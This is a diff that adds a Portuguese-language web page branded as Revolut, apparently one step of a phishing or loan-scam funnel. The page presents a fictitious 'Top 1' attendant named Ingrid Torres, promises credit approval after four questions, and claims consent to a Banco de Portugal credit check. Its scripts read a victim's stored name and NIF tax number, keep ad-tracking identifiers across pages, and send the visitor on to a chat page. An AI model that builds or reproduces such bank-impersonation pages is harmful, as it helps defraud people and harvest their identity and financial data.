@@ -1,0 +1,434 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+<script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<title>Fale com a Ingrid Torres — Revolut</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap');
+
+  :root {
+    --black: #0a0a0a;
+    --bg: #F4F5F7;
+    --card: #FFFFFF;
+    --text: #111827;
+    --text-mid: #374151;
+    --text-light: #6B7280;
+    --border: #E5E7EB;
+    --border-light: #F3F4F6;
+    --accent-soft: #EEEAFB;
+    --radius: 24px;
+    --shadow: 0 4px 24px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    min-height: 100vh;
+    padding-top: 72px;
+    display: flex; flex-direction: column;
+    line-height: 1.5;
+  }
+  header.header {
+    background:#fff; padding:14px 0;
+    position:fixed; top:0; width:100%; z-index:1000;
+    box-shadow: 0 1px 0 var(--border);
+  }
+  .header-content {
+    padding: 0 20px; display:flex; align-items:center; justify-content:space-between;
+    max-width:420px; margin:0 auto;
+  }
+  .header-left { display:flex; align-items:center; gap:14px; }
+  .menu-icon {
+    width:36px; height:36px; border-radius:50%;
+    background: var(--accent-soft);
+    display:flex; align-items:center; justify-content:center;
+  }
+  .menu-icon svg { width:18px; height:18px; color: var(--black); stroke-width:2.2; }
+  .header-right { display:flex; align-items:center; gap:10px; }
+  .user-info { text-align:right; line-height:1.1; }
+  .user-name { font-size:13px; font-weight:700; color: var(--text); text-transform: capitalize; }
+  .user-nif  { font-size:11px; color: var(--text-light); letter-spacing:.5px; }
+  .avatar {
+    width:34px; height:34px; border-radius:50%;
+    border:1px solid var(--border);
+    display:flex; align-items:center; justify-content:center;
+    color: var(--text-mid);
+  }
+  .avatar svg { width:18px; height:18px; }
+
+  .container { flex:1; padding: 18px 16px 28px; display:flex; justify-content:center; }
+  .card {
+    width: 100%; max-width: 420px;
+    background: var(--card); border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 28px 22px 30px;
+    text-align: center;
+  }
+
+  .avatar-wrap {
+    position: relative;
+    width: 130px;
+    height: 130px;
+    margin: 0 auto 18px;
+  }
+  .avatar-ring {
+    width: 130px; height: 130px; border-radius: 50%;
+    border: 2.5px solid var(--black);
+    overflow: hidden;
+    position: relative;
+    background: #f8f8f8;
+  }
+  .avatar-ring img {
+    width: 100%; height: 100%; object-fit: cover;
+  }
+  .avatar-overlay {
+    position: absolute;
+    bottom: 14px; left: 0; right: 0;
+    display: flex; align-items: center; justify-content: center;
+    pointer-events: none;
+  }
+  .avatar-overlay span {
+    color: #fff;
+    font-family: 'Sora', sans-serif;
+    font-weight: 800;
+    font-size: 11px;
+    letter-spacing: .6px;
+    text-shadow: 0 1px 3px rgba(0,0,0,.5);
+    padding: 2px 8px;
+    border-radius: 4px;
+    background: rgba(0,0,0,.28);
+  }
+  .top-badge {
+    position: absolute;
+    bottom: -4px; right: -6px;
+    background: #FFC107;
+    color: var(--black);
+    border-radius: 999px;
+    padding: 4px 8px;
+    font-size: 10px;
+    font-weight: 800;
+    display: inline-flex; align-items: center; gap: 3px;
+    box-shadow: 0 2px 6px rgba(0,0,0,.12);
+    border: 2px solid #fff;
+  }
+  .top-badge svg { width: 9px; height: 9px; }
+
+  .person-name {
+    font-family: 'Sora', sans-serif;
+    font-size: 22px; font-weight: 700; color: var(--text);
+  }
+  .person-role {
+    font-size: 13px; color: var(--text-light); margin-top: 3px;
+  }
+
+  .divider {
+    height: 1px; background: var(--border);
+    margin: 22px 0;
+  }
+
+  .pitch {
+    font-size: 16px; font-weight: 700; color: var(--text);
+    line-height: 1.45;
+    margin-bottom: 14px;
+  }
+
+  .pill {
+    display: inline-flex; align-items: center; gap: 7px;
+    background: #F3F0E8;
+    color: var(--text-mid);
+    border-radius: 999px;
+    padding: 8px 14px;
+    font-size: 13px; font-weight: 600;
+    margin-bottom: 10px;
+  }
+  .pill svg { width: 16px; height: 16px; color: var(--text-mid); stroke-width: 2; }
+
+  .tag-line {
+    font-size: 13px; color: var(--text-light); margin-bottom: 20px;
+  }
+
+  .checks {
+    display: flex; flex-direction: column; gap: 10px;
+    text-align: left;
+    margin-bottom: 22px;
+  }
+  .check-item {
+    display: flex; align-items: flex-start; gap: 12px;
+    font-size: 14px; color: var(--text-mid); line-height: 1.45;
+    background: #FAFAFB;
+    border-radius: 14px;
+    padding: 13px 14px;
+  }
+  .check-icon {
+    width: 20px; height: 20px; min-width: 20px; border-radius: 50%;
+    background: var(--black); color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    margin-top: 1px;
+  }
+  .check-icon svg { width: 12px; height: 12px; stroke-width: 2.8; }
+
+  .btn-go {
+    width: 100%;
+    height: 58px;
+    background: var(--black); color: #fff;
+    border: none; border-radius: 999px;
+    font-family: 'DM Sans', sans-serif; font-weight: 700; font-size: 16px;
+    cursor: pointer;
+    display:flex; align-items:center; justify-content:center; gap:10px;
+    transition: transform .15s ease, opacity .2s ease;
+  }
+  .btn-go:active { transform: scale(.98); }
+  .btn-go.loading .spinner { display:block; }
+  .btn-go.loading span,
+  .btn-go.loading svg { opacity: 0; }
+  .spinner {
+    display:none; position:absolute;
+    width:20px; height:20px; border-radius:50%;
+    border: 2.5px solid rgba(255,255,255,.35); border-top-color:#fff;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  footer.site-footer {
+    margin-top: 18px; padding: 18px 20px 28px;
+    text-align:center; color: var(--text-light); font-size: 12px;
+  }
+  .footer-logo img { height: 31px; width:auto; display:block; margin: 0 auto 8px; }
+  .footer-company { font-weight: 600; color: var(--text-mid); }
+  .footer-meta { margin-top: 2px; }
+  .footer-badges {
+    margin-top: 10px; display:flex; justify-content:center; gap: 14px; flex-wrap:wrap;
+  }
+  .footer-badges span { display:inline-flex; align-items:center; gap:5px; color: var(--text-mid); }
+  .footer-badges svg { width: 14px; height: 14px; color: var(--text-mid); }
+
+  @media (max-width: 360px) {
+    .card { padding: 24px 18px 26px; }
+    .pitch { font-size: 15px; }
+    .check-item { font-size: 13px; padding: 12px; }
+  }
+</style>
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-content">
+    <div class="header-left">
+      <div class="menu-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </div>
+      <img alt="Revolut" src="images/revolut-logo.svg" style="height:24px;width:auto;">
+    </div>
+    <div class="header-right">
+      <div class="user-info">
+        <div class="user-name" id="userName">Cliente</div>
+        <div class="user-nif" id="userNif">••• ••• •••</div>
+      </div>
+      <div class="avatar">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="card">
+    <div class="avatar-wrap">
+      <div class="avatar-ring">
+        <img alt="Ingrid Torres" src="images/ingrid-avatar.png">
+        <div class="avatar-overlay"><span>Revolut</span></div>
+      </div>
+      <div class="top-badge">
+        <svg fill="currentColor" viewBox="0 0 24 24">
+          <path d="M12 2l2.4 7.2h7.6l-6 4.8 2.4 7.2-6-4.8-6 4.8 2.4-7.2-6-4.8h7.6z"></path>
+        </svg>
+        TOP 1
+      </div>
+    </div>
+
+    <div class="person-name">Ingrid Torres</div>
+    <div class="person-role">Top 1 Atendente 2026</div>
+
+    <div class="divider"></div>
+
+    <div class="pitch">Fale com a nossa especialista Top 1 e conclua em menos de 2 minutos!</div>
+
+    <div class="pill">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="9" stroke-linecap="round" stroke-linejoin="round"></circle>
+        <path d="M12 7v5l3 2" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+      Apenas 4 perguntas
+    </div>
+
+    <div class="tag-line">Processo rápido, seguro e sem complicação.</div>
+
+    <div class="checks">
+      <div class="check-item">
+        <div class="check-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        </div>
+        <span>Crédito sujeito à análise e aprovação</span>
+      </div>
+      <div class="check-item">
+        <div class="check-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        </div>
+        <span>Autorizo consulta ao SCR do Banco de Portugal</span>
+      </div>
+      <div class="check-item">
+        <div class="check-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        </div>
+        <span>Dados 100% protegidos e confidenciais</span>
+      </div>
+    </div>
+
+    <button class="btn-go" id="btnGo" type="button">
+      <span>Prosseguir com Ingrid Torres</span>
+      <svg fill="none" stroke="currentColor" stroke-width="2.4" viewBox="0 0 24 24" width="18" height="18">
+        <path d="M5 12h14M13 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+      <div class="spinner"></div>
+    </button>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-logo">
+      <img src="images/revolut-logo.svg" alt="Revolut" style="height:36px;width:auto;display:block;margin:0 auto;">
+    </div>
+    <div class="footer-company">Rev Business LTD</div>
+    <div class="footer-meta">Avenida da Liberdade, 110 - 1269-046 Lisboa</div>
+    <div class="footer-badges">
+      <span>
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        SSL Seguro
+      </span>
+      <span>
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M9 12l2 2 4-4m5.6-4A11.95 11.95 0 0112 3 11.95 11.95 0 013.4 6 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.1-2-.4-3z" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        Dados protegidos
+      </span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  (function () {
+    const nome = localStorage.getItem('nome') || '';
+    const nif  = localStorage.getItem('nif')  || '';
+    if (nome) {
+      const parts = nome.trim().split(/\s+/);
+      const first = parts[0] || '';
+      const last  = parts.slice(-1)[0] || '';
+      const label = (first + (last && last !== first ? ' ' + last : ''));
+      document.getElementById('userName').textContent = label;
+    }
+    if (nif) {
+      const digits = nif.replace(/\D/g, '');
+      if (digits.length >= 9) {
+        document.getElementById('userNif').textContent =
+          digits.slice(0,3) + ' *** ' + digits.slice(6,9);
+      }
+    }
+  })();
+
+  document.getElementById('btnGo').addEventListener('click', function () {
+    const btn = this;
+    btn.classList.add('loading');
+    const p = new URLSearchParams(window.location.search);
+    setTimeout(() => {
+      redirectWithParams('chat.html');
+    }, 800);
+  });
+</script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl503952'},{'dcenter':'sxb1'},{'cp_id':'10972497'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body></html>
